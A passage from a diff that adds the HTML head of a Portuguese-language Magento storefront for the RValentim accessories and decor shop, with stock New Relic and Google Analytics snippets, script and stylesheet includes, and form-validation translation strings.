@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt" lang="pt">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQMGV1FbGwEFUllVAAEF"};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{c.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(19),c={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(c.console=!0,o.indexOf("dev")!==-1&&(c.dev=!0),o.indexOf("nr_dev")!==-1&&(c.nrDev=!0))}catch(s){}c.nrDev&&i.on("internal-error",function(t){r(t.stack)}),c.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),c.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(c,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,o){try{h?h-=1:i("err",[o||new UncaughtException(t,e,n)])}catch(c){try{i("ierr",[c,(new Date).getTime(),!0])}catch(s){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t){i("err",[t,(new Date).getTime()])}var i=t("handle"),a=t(20),c=t("ee"),s=t("loader"),f=window.onerror,u=!1,h=0;s.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(p){"stack"in p&&(t(12),t(11),"addEventListener"in window&&t(6),s.xhrWrappable&&t(13),u=!0)}c.on("fn-start",function(t,e,n){u&&(h+=1)}),c.on("fn-err",function(t,e,n){u&&(this.thrown=!0,o(n))}),c.on("fn-end",function(){u&&!this.thrown&&h>0&&(h-=1)}),c.on("internal-error",function(t){i("ierr",[t,(new Date).getTime(),!0])})},{}],3:[function(t,e,n){t("loader").features.ins=!0},{}],4:[function(t,e,n){function r(){N++,S=y.hash,this[u]=Date.now()}function o(){N--,y.hash!==S&&i(0,!0);var t=Date.now();this[l]=~~this[l]+t-this[u],this[h]=t}function i(t,e){x.emit("newURL",[""+y,e])}function a(t,e){t.on(e,function(){this[e]=Date.now()})}var c="-start",s="-end",f="-body",u="fn"+c,h="fn"+s,p="cb"+c,d="cb"+s,l="jsTime",m="fetch",v="addEventListener",w=window,y=w.location;if(w[v]){var g=t(9),b=t(10),x=t(8),E=t(6),T=t(12),O=t(7),P=t(13),R=t("ee"),D=R.get("tracer");t(14),t("loader").features.spa=!0;var S,M=w[v],N=0;R.on(u,r),R.on(p,r),R.on(h,o),R.on(d,o),R.buffer([u,h,"xhr-done","xhr-resolved"]),E.buffer([u]),T.buffer(["setTimeout"+s,"clearTimeout"+c,u]),P.buffer([u,"new-xhr","open-xhr"+c]),O.buffer([m+c,m+"-done",m+f+c,m+f+s]),x.buffer(["newURL"]),g.buffer([u]),b.buffer(["propagate",p,d,"executor-err","resolve"+c]),D.buffer([u,"no-"+u]),a(P,"open-xhr"+c),a(R,"xhr-resolved"),a(R,"xhr-done"),a(O,m+c),a(O,m+"-done"),x.on("pushState-end",i),x.on("replaceState-end",i),M("hashchange",i,!0),M("load",i,!0),M("popstate",function(){i(0,N>1)},!0)}},{}],5:[function(t,e,n){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(12),c=t(11),s="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",h="bstResource",p="resource",d="-start",l="-end",m="fn"+d,v="fn"+l,w="bstTimer",y="pushState";t("loader").features.stn=!0,t(8);var g=NREUM.o.EV;o.on(m,function(t,e){var n=t[0];n instanceof g&&(this.bstStart=Date.now())}),o.on(v,function(t,e){var n=t[0];n instanceof g&&i("bst",[n,e,this.bstStart,Date.now()])}),a.on(m,function(t,e,n){this.bstStart=Date.now(),this.bstType=n}),a.on(v,function(t,e){i(w,[e,this.bstStart,Date.now(),this.bstType])}),c.on(m,function(){this.bstStart=Date.now()}),c.on(v,function(t,e){i(w,[e,this.bstStart,Date.now(),"requestAnimationFrame"])}),o.on(y+d,function(t){this.time=Date.now(),this.startPath=location.pathname+location.hash}),o.on(y+l,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+s]?window.performance[f](u,function(t){i(h,[window.performance.getEntriesByType(p)]),window.performance["c"+s]()},!1):window.performance[f]("webkit"+u,function(t){i(h,[window.performance.getEntriesByType(p)]),window.performance["webkitC"+s]()},!1)),document[f]("scroll",r,!1),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],6:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){c.inPlace(t,[u,h],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),c=t(21)(a),s=t("gos"),f=XMLHttpRequest,u="addEventListener",h="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){if(t[1]){var n=t[1];if("function"==typeof n){var r=s(n,"nr@wrapped",function(){return c(n,"fn-",null,n.name||"anonymous")});this.wrapped=t[1]=r}else"function"==typeof n.handleEvent&&c.inPlace(n,["handleEvent"],"fn-")}}),a.on(h+"-start",function(t){var e=this.wrapped;e&&(t[1]=e)})},{}],7:[function(t,e,n){function r(t,e,n){var r=t[e];"function"==typeof r&&(t[e]=function(){var t=r.apply(this,arguments);return o.emit(n+"start",arguments,t),t.then(function(e){return o.emit(n+"end",[null,e],t),e},function(e){throw o.emit(n+"end",[e],t),e})})}var o=t("ee").get("fetch"),i=t(19);e.exports=o;var a=window,c="fetch-",s=c+"body-",f=["arrayBuffer","blob","json","text","formData"],u=a.Request,h=a.Response,p=a.fetch,d="prototype";u&&h&&p&&(i(f,function(t,e){r(u[d],e,s),r(h[d],e,s)}),r(a,"fetch",c),o.on(c+"end",function(t,e){var n=this;e?e.clone().arrayBuffer().then(function(t){n.rxSize=t.byteLength,o.emit(c+"done",[null,e],n)}):o.emit(c+"done",[t],n)}))},{}],8:[function(t,e,n){var r=t("ee").get("history"),o=t(21)(r);e.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],9:[function(t,e,n){var r=t("ee").get("mutation"),o=t(21)(r),i=NREUM.o.MO;e.exports=r,i&&(window.MutationObserver=function(t){return this instanceof i?new i(o(t,"fn-")):i.apply(this,arguments)},MutationObserver.prototype=i.prototype)},{}],10:[function(t,e,n){function r(t){var e=a.context(),n=c(t,"executor-",e),r=new f(n);return a.context(r).getCtx=function(){return e},a.emit("new-promise",[r,e],e),r}function o(t,e){return e}var i=t(21),a=t("ee").get("promise"),c=i(a),s=t(19),f=NREUM.o.PR;e.exports=a,f&&(window.Promise=r,["all","race"].forEach(function(t){var e=f[t];f[t]=function(n){function r(t){return function(){a.emit("propagate",[null,!o],i),o=o||!t}}var o=!1;s(n,function(e,n){Promise.resolve(n).then(r("all"===t),r(!1))});var i=e.apply(f,arguments),c=f.resolve(i);return c}}),["resolve","reject"].forEach(function(t){var e=f[t];f[t]=function(t){var n=e.apply(f,arguments);return t!==n&&a.emit("propagate",[t,!0],n),n}}),f.prototype["catch"]=function(t){return this.then(null,t)},f.prototype=Object.create(f.prototype,{constructor:{value:r}}),s(Object.getOwnPropertyNames(f),function(t,e){try{r[e]=f[e]}catch(n){}}),a.on("executor-start",function(t){t[0]=c(t[0],"resolve-",this),t[1]=c(t[1],"resolve-",this)}),a.on("executor-err",function(t,e,n){t[1](n)}),c.inPlace(f.prototype,["then"],"then-",o),a.on("then-start",function(t,e){this.promise=e,t[0]=c(t[0],"cb-",this),t[1]=c(t[1],"cb-",this)}),a.on("then-end",function(t,e,n){this.nextPromise=n;var r=this.promise;a.emit("propagate",[r,!0],n)}),a.on("cb-end",function(t,e,n){a.emit("propagate",[n,!0],this.nextPromise)}),a.on("propagate",function(t,e,n){this.getCtx&&!e||(this.getCtx=function(){if(t instanceof Promise)var e=a.context(t);return e&&e.getCtx?e.getCtx():this})}),r.toString=function(){return""+f})},{}],11:[function(t,e,n){var r=t("ee").get("raf"),o=t(21)(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],12:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration="number"==typeof t[1]?t[1]:0,t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t(21)(i),c="setTimeout",s="setInterval",f="clearTimeout",u="-start",h="-";e.exports=i,a.inPlace(window,[c,"setImmediate"],c+h),a.inPlace(window,[s],s+h),a.inPlace(window,[f,"clearImmediate"],f+h),i.on(s+u,r),i.on(c+u,o)},{}],13:[function(t,e,n){function r(t,e){h.inPlace(e,["onreadystatechange"],"fn-",c)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),h.inPlace(t,v,"fn-",c)}function i(t){w.push(t),l&&(g=-g,b.data=g)}function a(){for(var t=0;t<w.length;t++)r([],w[t]);w.length&&(w=[])}function c(t,e){return e}function s(t,e){for(var n in t)e[n]=t[n];return e}t(6);var f=t("ee"),u=f.get("xhr"),h=t(21)(u),p=NREUM.o,d=p.XHR,l=p.MO,m="readystatechange",v=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],w=[];e.exports=u;var y=window.XMLHttpRequest=function(t){var e=new d(t);try{u.emit("new-xhr",[e],e),e.addEventListener(m,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(s(d,y),y.prototype=d.prototype,h.inPlace(y.prototype,["open","send"],"-xhr-",c),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),l){var g=1,b=document.createTextNode(g);new l(a).observe(b,{characterData:!0})}else f.on("fn-end",function(t){t[0]&&t[0].type===m||a()})},{}],14:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<h;r++)t.removeEventListener(u[r],this.listener,!1);if(!e.aborted){if(n.duration=(new Date).getTime()-this.startTime,4===t.readyState){e.status=t.status;var i=o(t,this.lastSize);if(i&&(n.rxSize=i),this.sameOrigin){var a=t.getResponseHeader("X-NewRelic-App-Data");a&&(e.cat=a.split(", ").pop())}}else e.status=0;n.cbTime=this.cbTime,f.emit("xhr-done",[t],t),c("xhr",[e,n,this.startTime])}}}function o(t,e){var n=t.responseType;if("json"===n&&null!==e)return e;var r="arraybuffer"===n||"blob"===n||"json"===n?t.response:t.responseText;return l(r)}function i(t,e){var n=s(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}var a=t("loader");if(a.xhrWrappable){var c=t("handle"),s=t(15),f=t("ee"),u=["load","error","abort","timeout"],h=u.length,p=t("id"),d=t(18),l=t(17),m=window.XMLHttpRequest;a.features.xhr=!0,t(13),f.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,d&&(d>34||d<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=l(r);i&&(n.txSize=i)}this.startTime=(new Date).getTime(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{f.emit("internal-error",[n])}catch(r){}}};for(var a=0;a<h;a++)e.addEventListener(u[a],this.listener,!1)}),f.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),f.on("xhr-load-added",function(t,e){var n=""+p(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,e){var n=""+p(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],e)}),f.on("removeEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],e)}),f.on("fn-start",function(t,e,n){e instanceof m&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=(new Date).getTime()))}),f.on("fn-end",function(t,e){this.xhrCbStart&&f.emit("xhr-cb-time",[(new Date).getTime()-this.xhrCbStart,this.onload,e],e)})}},{}],15:[function(t,e,n){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!e.protocol||":"===e.protocol||e.protocol===n.protocol,a=e.hostname===document.domain&&e.port===n.port;return r.sameOrigin=i&&(!e.hostname||a),r}},{}],16:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(c(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(19),c=t(20),s=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var u=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],h="api-",p=h+"ixn-";a(u,function(t,e){f[e]=o(h+e,!0,"api")}),f.addPageAction=o(h+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var d=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(p+"tracer",[Date.now(),t,n],r),function(){if(s.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{s.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){d[e]=o(p+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],17:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],18:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],19:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],20:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],21:[function(t,e,n){function r(t){return!(t&&"function"==typeof t&&t.apply&&!t[a])}var o=t("ee"),i=t(20),a="nr@original",c=Object.prototype.hasOwnProperty,s=!1;e.exports=function(t){function e(t,e,n,o){function nrWrapper(){var r,a,c,s;try{a=this,r=i(arguments),c="function"==typeof n?n(r,a):n||{}}catch(u){h([u,"",[r,a,o],c])}f(e+"start",[r,a,o],c);try{return s=t.apply(a,r)}catch(p){throw f(e+"err",[r,a,p],c),p}finally{f(e+"end",[r,a,s],c)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,u(t,nrWrapper),nrWrapper)}function n(t,n,o,i){o||(o="");var a,c,s,f="-"===o.charAt(0);for(s=0;s<n.length;s++)c=n[s],a=t[c],r(a)||(t[c]=e(a,f?c+o:o,i,c))}function f(e,n,r){if(!s){s=!0;try{t.emit(e,n,r)}catch(o){h([o,e,n,r])}s=!1}}function u(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){h([r])}for(var o in t)c.call(t,o)&&(e[o]=t[o]);return e}function h(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),e.inPlace=n,e.flag=a,e}},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?c(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=p(n),c=a.length,s=0;s<c;s++)a[s].apply(i,r);var u=f[v[n]];return u&&u.push([w,n,r,i]),i}function h(t,e){m[t]=p(t).concat(e)}function p(t){return m[t]||[]}function d(t){return u[t]=u[t]||o(n)}function l(t,e){s(t,function(t,n){e=e||"feature",v[n]=e,e in f||(f[e]=[])})}var m={},v={},w={on:h,emit:n,get:d,listeners:p,context:e,buffer:l};return w}function i(){return new r}var a="nr@context",c=t("gos"),s=t(19),f={},u={},h=e.exports=o();h.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!g++){var t=y.info=NREUM.info,e=u.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){s(v,function(e,n){t[e]||(t[e]=n)});var n="https"===m.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",c("mark",["onload",a()],null,"api");var r=u.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===u.readyState&&i()}function i(){c("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var c=t("handle"),s=t(19),f=window,u=f.document,h="addEventListener",p="attachEvent",d=f.XMLHttpRequest,l=d&&d.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:d,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(16);var m=""+location,v={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-spa-974.min.js"},w=d&&l&&l[h]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:m,features:{},xhrWrappable:w};u[h]?(u[h]("DOMContentLoaded",i,!1),f[h]("load",r,!1)):(u[p]("onreadystatechange",o),f[p]("onload",r)),c("mark",["firstbyte",a()],null,"api");var g=0},{}]},{},["loader",2,14,5,3,4]);</script>
+<title>Acessorios e Decoracao | RValentim</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Focada em acessórios e decoração que tenha um estilo despojado e irreverente,  a energia do Rock´n Roll e  o bom humor como inspiração A R valentim oferece uma diversidade de produtos para deixar seu escritório ou casa exatamente no teu estilo. Confira!" />
+<meta name="keywords" content="Acessorios, decoracao, rock" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.rvalentim.com/js/blank.html';
+    var BLANK_IMG = 'http://www.rvalentim.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/css/bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/css/bootstrap-theme.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/unibanner/css/skitter.styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/unibanner/css/highlight.black.css" media="all" />
+<script type="text/javascript" src="http://www.rvalentim.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/lib/jquery/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/lib/jquery/noconflict.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/skyhub/tracker.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/js/awmage.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/unibanner/js/jquery.animate-colors-min.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/unibanner/js/jquery.skitter.min.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/unibanner/js/highlight.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.rvalentim.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.rvalentim.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["BR"];
+//]]>
+</script>
+            <!-- BEGIN GOOGLE ANALYTICS CODE -->
+        <script type="text/javascript">
+        //<![CDATA[
+            var _gaq = _gaq || [];
+            
+_gaq.push(['_setAccount', 'UA-17555078-1']);
+    setSkyhubCustomVariables(_gaq);
+_gaq.push(['_trackPageview']);
+            
+            (function() {
+                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+            })();
+
+        //]]>
+        </script>
+        <!-- END GOOGLE ANALYTICS CODE -->
+    <script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"HTML tags are not allowed":"Tags HTML n\u00e3o s\u00e3o permitidas","Please select an option.":"Selecione uma op\u00e7\u00e3o.","This is a required field.":"Campo obrigat\u00f3rio.","Please enter a valid number in this field.":"Informe um n\u00famero v\u00e1lido.","The value is not within the specified range.":"O valor n\u00e3o est\u00e1 dentro do limite especificado.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"Utilize apenas n\u00fameros. Evite espa\u00e7os ou outros caracteres como pontos ou v\u00edrgulas.","Please use letters only (a-z or A-Z) in this field.":"Utilize apenas letras (a-z ou A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Utilize apenas letras (a-z), n\u00fameros (0-9) ou underline(_), primeiro car\u00e1cter precisa ser uma letra.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"Utilize apenas letras (a-z ou A-Z) ou n\u00fameros (0-9). Espa\u00e7os ou outros caracteres n\u00e3o ser\u00e3o permitidos.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"Utilize apenas letras (a-z ou A-Z) ou n\u00fameros (0-9) ou espa\u00e7os e #.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Informe um n\u00famero de telefone v\u00e1lido. Por exemplo, (123) 456-7890 ou 123-456-7890.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"Informe um n\u00famero de celular v\u00e1lido. Por exemplo, (123) 456-7890 ou 123-456-7890.","Please enter a valid date.":"Informe uma data v\u00e1lida.","The From Date value should be less than or equal to the To Date value.":"A Data de In\u00e9cio deve ser menor ou igual \u00e0 Data Final.","Please enter a valid email address. For example johndoe@domain.com.":"Informe um endere\u00e7o de email v\u00e1lido. Por exemplo, johndoe@domain.com.","Please use only visible characters and spaces.":"Utilize apenas caracteres vis\u00edveis e espa\u00e7os.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Informe 6 ou mais caracteres. Espa\u00e7os a direita ou a esquerda ser\u00e3o ignorados.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"Informe 7 ou mais caracteres. Senha precisa conter ambos caracteres, n\u00fameros e letras.","Please make sure your passwords match.":"Verifique se as senhas conferem.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"Informe uma URL v\u00e1lida. Protocolo obrigat\u00f3rio (http:\/\/, https:\/\/ ou ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Informe uma URL v\u00e1lida. Por exemplo, http:\/\/www.example.com ou www.example.com","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"Informe uma URL v\u00e1lida. Por exemplo, \"exemplo-pagina\", \"exemplo-pagina.html\" ou \"umacategoria\/exemplo-pagina\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"Informe um identificador XML v\u00e1lido. Por exemplo, algumacoisa_1, block5, id-4.","Please enter a valid social security number. For example 123-45-6789.":"Informe um CPF v\u00e1lido. Por exemplo, 123.455.678-9.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Informe um CEP v\u00e1lido. Por exemplo, 90602 ou 90602-1234.","Please enter a valid zip code.":"Informe um CEP v\u00e1lido.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Utilize este formato de data: dd\/mm\/yyyy. Por exemplo, 17\/03\/2006 para informar 17th de Mar\u00e7o, 2006.","Please enter a valid $ amount. For example $100.00.":"Informe um valor $ . Por exemplo, $100.00.","Please select one of the above options.":"Selecione uma das op\u00e7\u00f5es abaixo.","Please select one of the options.":"Selecione uma das op\u00e7\u00f5es.","Please select State\/Province.":"Selecione Estado...","Please enter a number greater than 0 in this field.":"Informe um n\u00famero maior que zero.","Please enter a number 0 or greater in this field.":"Informe um n\u00famero igual ou maior que zero.","Please enter a valid credit card number.":"Informe um n\u00famero de cart\u00e3o de cr\u00e9dito v\u00e1lido.","Credit card number does not match credit card type.":"N\u00famero do cart\u00e3o de cr\u00e9dito n\u00e3o condiz com tipo de cart\u00e3o.","Card type does not match credit card number.":"Tipo de cart\u00e3o n\u00e3o condiz com n\u00famero do cart\u00e3o de cr\u00e9dito.","Incorrect credit card expiration date.":"Data de expira\u00e7\u00e3o do cart\u00e3o n\u00e3o \u00e9 v\u00e1lido.","Please enter a valid credit card verification number.":"Informe um n\u00famero de verifica\u00e7\u00e3o de cart\u00e3o de cr\u00e9dito v\u00e1lido.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"Informe um tamanho v\u00e1lido de CSS no campo. Por exemplo, 100px ou 77pt ou 20em ou .5ex ou 50%.","Text length does not satisfy specified text range.":"Tamanho do texto 